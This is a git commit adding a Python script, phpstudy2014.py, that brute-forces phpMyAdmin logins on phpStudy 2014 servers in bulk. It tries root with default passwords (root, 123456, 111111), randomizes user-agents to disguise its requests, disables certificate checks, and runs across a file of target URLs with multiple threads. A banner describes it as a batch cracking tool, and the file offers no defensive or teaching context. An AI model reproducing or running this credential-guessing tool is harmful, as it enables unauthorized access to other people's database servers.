5cb5f5cf2e5967d15c3e6cc1e2791d5ba28c2e77
m2 <44486276+MzzdToT@users.noreply.github.com>
2021-04-06 10:10:02 +0800

    Add files via upload

---
+++ phpstudy2014.py
@@ -0,0 +1,107 @@
+import requests
+import re
+import sys
+import urllib3
+from argparse import ArgumentParser
+import threadpool
+from urllib import parse
+from time import time
+import random
+
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+filename = sys.argv[1]
+url_list=[]
+
+#随机ua
+def get_ua():
+	first_num = random.randint(55, 62)
+	third_num = random.randint(0, 3200)
+	fourth_num = random.randint(0, 140)
+	os_type = [
+		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
+		'(Macintosh; Intel Mac OS X 10_12_6)'
+	]
+	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)
+
+	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
+				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
+				  )
+	return ua
+
+#payload
+def fuzz(url):
+	url = parse.urlparse(url)
+	url1 = url.scheme + '://' + url.netloc +'/phpmyadmin/index.php'
+	username=['root']
+	password=['root','123456','111111']
+	for i in username:
+		for j in password:
+			data={
+			"pma_username":i,
+			"pma_password":j,
+			"server":"1",
+			}
+			try:
+				headers = {'User-Agent': get_ua()}
+				r=requests.post(url1,headers=headers,data=data,verify=False,allow_redirects=True,timeout=10)
+				if r.status_code == 200 and 'phpMyAdmin phpStudy 2014' in r.text:
+					print('\033[32m[+]%s Login Success！ username:%s&password:%s\033[0m' %(url1,i,j))
+					#登录成功退出
+					break
+				else :
+					print('\033[31m[-]%s Login False\033[0m' %url1)
+			except Exception as e:
+				print('[!]%s is timeout' %url1)
+				#登录超时退出
+				break
+
+
+#多线程
+def multithreading(url_list, pools=5):
+	works = []
+	for i in url_list:
+		# works.append((func_params, None))
+		works.append(i)
+	# print(works)
+	pool = threadpool.ThreadPool(pools)
+	reqs = threadpool.makeRequests(fuzz, works)
+	[pool.putRequest(req) for req in reqs]
+	pool.wait()
+
+
+if __name__ == '__main__':
+	show = r'''
+	       _               _             _        ______             
+	      | |             | |           | |       |  ___|            
+	 _ __ | |__  _ __  ___| |_ _   _  __| |_   _  | |_ _   _ ________
+	| '_ \| '_ \| '_ \/ __| __| | | |/ _` | | | | |  _| | | |_  /_  /
+	| |_) | | | | |_) \__ \ |_| |_| | (_| | |_| | | | | |_| |/ / / / 
+	| .__/|_| |_| .__/|___/\__|\__,_|\__,_|\__, | \_|  \__,_/___/___|
+	| |         | |                         __/ |                    
+	|_|         |_|                        |___/                     
+	                                                                    
+	                                                                    
+                                                        	By m2
+	'''
+	print(show + '\n')
+	arg=ArgumentParser(description='phpstudy2014批量爆破 By m2')
+	arg.add_argument("-u",
+						"--url",
+						help="Target URL; Example:http://ip:port")
+	arg.add_argument("-f",
+						"--file",
+						help="Target URL; Example:url.txt")
+	args=arg.parse_args()
+	url=args.url
+	filename=args.file
+	start=time()
+	if url != None and filename == None:
+		fuzz(url)
+	elif url == None and filename != None:
+		for i in open(filename):
+			i=i.replace('\n','')
+			url_list.append(i)
+		multithreading(url_list,10)
+	end=time()
+	print('任务完成，用时%d' %(end-start))
